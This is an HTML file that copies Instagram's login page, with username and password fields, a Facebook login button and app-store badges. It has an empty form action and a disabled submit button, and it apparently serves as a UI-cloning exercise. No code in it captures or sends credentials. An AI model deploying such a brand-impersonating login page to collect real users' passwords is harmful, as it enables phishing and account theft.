<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="static/style.css">
    <link rel="icon" href="static/ig.png">
</head>
<body>
    <div id="container">
        <div id="main">

            <div id="app">
                <img src="static/pic.jpg" alt="Instagram page">
            </div>

            <div id="dialog">

                <div class="box">
                    <div class="logo">
                        <img  src="static/logo.png" alt="Instasgram">
                    </div>
                    <div id="loginForm">
                        <form action="">
                            <div class="inputing">
                                <input type="text" placeholder="Phone number, username, or email">
                            </div>
                            <div class="inputing">
                                <input type="password" placeholder="Password">
                            </div>
                            <button class="inputing" type="submit" id="logword" disabled>
                                <div >Log in</div>
                            </button>
                        </form>
                    </div>
                    <div class="or">
                        <div class="line"></div>
                        <div class="mid-or">OR</div>
                        <div class="line"></div>
                    </div>
                    <div >
                        <button type="button" class="logWithFacebook">
                            <img src="static/fb.png" alt="" id="fb">
                            <div>Log in with Facebook</div>
                        </button>
                    </div>
                    <div class="fpass">
                        <a href="#">
                            Forgot password?
                        </a>
                    </div>
                </div>
                <div class="box">
                    <p class="signup">
                        <span>Don't have an account?</span>
                        <a id="sign" href="#">Sign up</a>
                    </p>                 
                </div>
                <div id="getapp">
                    <div class="gettheapp">
                        <span>Get the app</span>
                    </div>
                    <div class="gettheapp2">
                        <a style="margin-right: 5px;" href="#">
                            <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="">
                        </a>
                        <a href="#">
                            <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="">
                        </a>
                    </div>
                </div>
            </div>
        </div>
